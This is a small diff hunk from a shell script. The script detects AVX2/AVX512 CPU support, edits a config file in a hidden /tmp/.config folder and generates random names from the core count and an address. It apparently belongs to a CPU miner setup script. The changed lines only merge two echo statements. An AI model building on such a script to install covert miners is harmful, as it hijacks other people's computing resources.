@@ -48,8 +48,7 @@ cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
 [ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "/tmp/.config/appsettings.json"
 [ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "/tmp/.config/appsettings.json"
 
-echo "##mode: ${mode}"
-echo "##name: `RandString 2 d${cores}_${addr}`"
+echo "#Mode: ${mode}_${cores}_${addr}"
 
 if [ "$mode" == "0" ]; then
   name=`RandString 2 c${cores}_${addr}`;
